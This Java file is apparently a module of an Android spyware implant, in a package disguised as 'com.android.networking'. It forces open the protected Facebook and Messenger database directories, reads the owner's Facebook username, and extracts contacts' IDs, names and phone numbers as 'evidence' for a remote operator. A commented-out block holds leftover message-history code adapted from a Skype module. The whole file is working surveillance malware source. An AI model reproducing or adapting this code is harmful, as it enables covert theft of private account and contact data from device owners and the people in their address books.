package com.android.networking.module.chat;

import java.io.File;
import java.io.IOException;
import java.util.Date;
import java.util.Hashtable;
import java.util.concurrent.Semaphore;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.json.JSONTokener;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;

import com.android.networking.Messages;
import com.android.networking.auto.Cfg;
import com.android.networking.db.GenericSqliteHelper;
import com.android.networking.db.RecordHashPairVisitor;
import com.android.networking.db.RecordHashtableIdVisitor;
import com.android.networking.db.RecordListVisitor;
import com.android.networking.db.RecordVisitor;
import com.android.networking.file.Path;
import com.android.networking.manager.ManagerModule;
import com.android.networking.module.ModuleAddressBook;
import com.android.networking.util.Check;

public class ChatFacebook extends SubModuleChat {

	private static final String TAG = "ChatFacebook";

	private static final int PROGRAM = 0x02;
	String pObserving = "facebook";

	private Date lastTimestamp;

	private Hashtable<String, Long> lastFb;
	Semaphore readChatSemaphore = new Semaphore(1, true);

	private String account = null;
	private String dbDir;

	@Override
	public int getProgramId() {
		return PROGRAM;
	}

	@Override
	String getObservingProgram() {
		return pObserving;
	}

	@Override
	void notifyStopProgram() {
		readFbMessageHistory();
	}

	@Override
	protected void start() {
		lastFb = markup.unserialize(new Hashtable<String, Long>());
		if (Cfg.DEBUG) {
			Check.log(TAG + " (start), read lastFb: " + lastFb);
		}

		account = readMyAccount();
		if (account != null) {
			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.FACEBOOK, account);

			readFbMessageHistory();
		}
	}

	@Override
	protected void stop() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stop), ");
		}
	}

	private String readMyAccount() {
		String fbdir1 = "/data/data/com.facebook.katana/databases";
		String fbdir2 = "/data/data/com.facebook.orca/databases";

		if (Path.unprotect(fbdir1)) {
			dbDir = fbdir1;
		} else if (Path.unprotect(fbdir2)) {
			dbDir = fbdir2;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readMyAccount) cannot unprotect dir");
			}
			return null;
		}

		String dbFile = "prefs_db";
		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
		SQLiteDatabase db = helper.getReadableDatabase();

		String[] projection = new String[] { "key", "value" };
		String selection = null;

		RecordHashPairVisitor visitor = new RecordHashPairVisitor(projection);
		helper.traverseRecords("preferences", visitor);

		Hashtable<String, String> preferences = visitor.getMap();

		return preferences.get("/auth/user_data/fb_username");
	}

	private void readFbMessageHistory() {
		if (!readChatSemaphore.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readFbMessageHistory), semaphore red");
			}
			return;
		}

		boolean updateMarkup = false;

		if (Cfg.DEBUG) {
			Check.log(TAG + " (readSkypeMessageHistory) account: " + account);
		}

		Path.unprotectAll(dbDir, true);

		if (ManagerModule.self().isInstancedAgent(ModuleAddressBook.class)) {
			if (Path.unprotect(dbDir, "users_db2", true)) {
				readAddressUser();

			} else if (Path.unprotect(dbDir, "contacts_db2", true)) {
				readAddressContacts();
			}
		}

		return;

	}

	private void readAddressUser() {
		String dbFile = "users_db2";
		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
		SQLiteDatabase db = helper.getReadableDatabase();

		String[] projection = new String[] { "fbid", "first_name", "last_name", "name", "email_addresses",
				"phone_numbers" };
		String selection = null;

		RecordHashtableIdVisitor visitor = new RecordHashtableIdVisitor(projection);
		helper.traverseRecords("facebook_user", visitor);

	}

	private void readAddressContacts() {
		String dbFile = "contacts_db2";
		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
		SQLiteDatabase db = helper.getReadableDatabase();

		RecordListVisitor visitor = new RecordListVisitor("data");
		helper.traverseRecords("contacts", visitor);

		for (String value : visitor.getList()) {
			try {
				JSONObject root = (JSONObject) new JSONTokener(value).nextValue();
				String fbId =  root.getString("profileFbid");
				JSONObject name = root.getJSONObject("name");
				String fullName = name.getString("displayName");
				
				JSONArray phones =  root.getJSONArray("phones");
				String numbers="";
				for(int i = 0; i< phones.length(); i++){
					numbers += phones.getJSONObject(i).get("universalNumber")+" ";
				}
				
				//String picture = root.getString("bigPictureUrl");
				
				Contact contact = new Contact(fbId, numbers, fullName,  "");
				ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.FACEBOOK, contact);

			} catch (JSONException e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readAddressContacts) Error: " + e);
				}
			}
		}
	}

	/*
	 * private void readFbMessageHistory() throws IOException{ if (Cfg.DEBUG) {
	 * Check.log(TAG + " (readChatMessages)"); }
	 * 
	 * if (!readChatSemaphore.tryAcquire()) { if (Cfg.DEBUG) { Check.log(TAG +
	 * " (readSkypeMessageHistory), semaphore red"); } return; } try { boolean
	 * updateMarkup = false;
	 * 
	 * // k_0=/data/data/com.skype.raider/files //String dbDir =
	 * Messages.getString("k_0"); String dbDir =
	 * "/data/data/com.facebook.orca/databases"; String dbFile = "users_db2";
	 * Path.unprotect(dbDir, true);
	 * 
	 * String account = readAccount(); if (account == null || account.length()
	 * == 0) return;
	 * 
	 * if (Cfg.DEBUG) { Check.log(TAG + " (readSkypeMessageHistory) account: " +
	 * account); } // k_1=/main.db String dbFile = dbDir + "/" + account +
	 * Messages.getString("k_1");
	 * 
	 * Path.unprotect(dbDir + "/" + account, true); Path.unprotect(dbFile,
	 * true); Path.unprotect(dbFile + "-journal", true);
	 * 
	 * File file = new File(dbFile);
	 * 
	 * if (file.canRead()) { if (Cfg.DEBUG) { Check.log(TAG +
	 * " (readSkypeMessageHistory): can read DB"); }
	 * 
	 * GenericSqliteHelper helper = GenericSqliteHelper.open(dbFile);
	 * 
	 * } }
	 */

}
